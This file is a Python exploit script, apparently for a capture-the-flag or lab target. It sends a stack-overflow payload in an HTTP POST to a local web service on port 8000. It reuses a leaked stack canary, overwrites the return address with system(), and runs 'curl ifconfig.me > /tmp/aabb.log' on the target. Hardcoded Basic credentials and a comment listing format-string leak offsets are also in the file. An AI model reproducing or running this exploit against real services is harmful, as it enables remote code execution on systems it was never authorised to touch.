import socket
import time
import base64
from sys import argv
import struct

canary = struct.pack('<L', int(argv[1], base=16))
ret_addr = struct.pack('<L', int(argv[2], base=16) - int("0x2d437", base=16))
# chech_auth + 0x2d437 = system
string_pointer  = struct.pack('<L', int(argv[3], base=16) - int("0x90", base=16))
# string_pointer = ebp - 0x94

body=""
tmp = "a" * 100 #total 100 chars
body+=str.encode(tmp)
body+=canary #write canary
tmp = "a" * 12 # go to return address
body+=str.encode(tmp)
body+=ret_addr # overide with system
tmp = "a" * 4 # cause of system call
body+=str.encode(tmp)
body+=string_pointer
body+="curl ifconfig.me > /tmp/aabb.log\x00"

# %27$p %28$p %30$p


s = socket.socket()
s.connect(('127.0.0.1',8000))

send="POST /ultimate.html HTTP/1.1\r\n"
send+="Host: localhost:8000\r\n"
send+="Authorization: Basic YWRtaW46eW91IHNoYWxsIG5vdCBwYXNz\r\n"
send+="Content-Type: application/octet-stream\r\n\r\n"
send+=body
s.send(send)

time.sleep(1)
#r = s.recv(2000)
#print r
